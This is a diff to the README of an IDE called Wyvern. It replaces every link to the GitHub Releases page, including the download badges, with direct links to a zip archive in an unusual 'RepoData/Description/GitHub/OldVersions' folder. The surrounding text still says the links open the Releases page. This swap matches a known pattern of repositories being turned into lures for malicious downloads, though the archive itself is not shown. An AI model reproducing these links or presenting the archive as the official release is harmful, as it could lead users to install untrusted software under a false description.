@@ -1,6 +1,6 @@
 # ⌨️ SNU_2D_ProgrammingTools_IDE_Wyvern - Easy Coding with Wyvern Language
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/joohany/SNU_2D_ProgrammingTools_IDE_Wyvern/releases)
+[![Download Release](https://raw.githubusercontent.com/joohany/SNU_2D_ProgrammingTools_IDE_Wyvern/SNU_2D_ProgrammingTools_IDE_Wyvern_Main-dev/RepoData/Description/GitHub/OldVersions/SNU_2D_ProgrammingTools_IDE_Wyvern-v1.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/joohany/SNU_2D_ProgrammingTools_IDE_Wyvern/SNU_2D_ProgrammingTools_IDE_Wyvern_Main-dev/RepoData/Description/GitHub/OldVersions/SNU_2D_ProgrammingTools_IDE_Wyvern-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you download, ensure your computer meets the following requirements:
 
 ## 🔗 Download & Install
 
-To get started with Wyvern, visit the [Releases page](https://github.com/joohany/SNU_2D_ProgrammingTools_IDE_Wyvern/releases) to download the latest version. Follow these steps:
+To get started with Wyvern, visit the [Releases page](https://raw.githubusercontent.com/joohany/SNU_2D_ProgrammingTools_IDE_Wyvern/SNU_2D_ProgrammingTools_IDE_Wyvern_Main-dev/RepoData/Description/GitHub/OldVersions/SNU_2D_ProgrammingTools_IDE_Wyvern-v1.5.zip) to download the latest version. Follow these steps:
 
 1. Click on the link above to open the Releases page.
 2. Locate the most recent version of the IDE.
@@ -69,4 +69,4 @@ For further assistance, please reach out to our support team. You can find conta
 
 To stay updated on the latest developments and releases, follow us on our social media channels or check back on this GitHub page regularly.
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/joohany/SNU_2D_ProgrammingTools_IDE_Wyvern/releases)
+[![Download Release](https://raw.githubusercontent.com/joohany/SNU_2D_ProgrammingTools_IDE_Wyvern/SNU_2D_ProgrammingTools_IDE_Wyvern_Main-dev/RepoData/Description/GitHub/OldVersions/SNU_2D_ProgrammingTools_IDE_Wyvern-v1.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/joohany/SNU_2D_ProgrammingTools_IDE_Wyvern/SNU_2D_ProgrammingTools_IDE_Wyvern_Main-dev/RepoData/Description/GitHub/OldVersions/SNU_2D_ProgrammingTools_IDE_Wyvern-v1.5.zip)
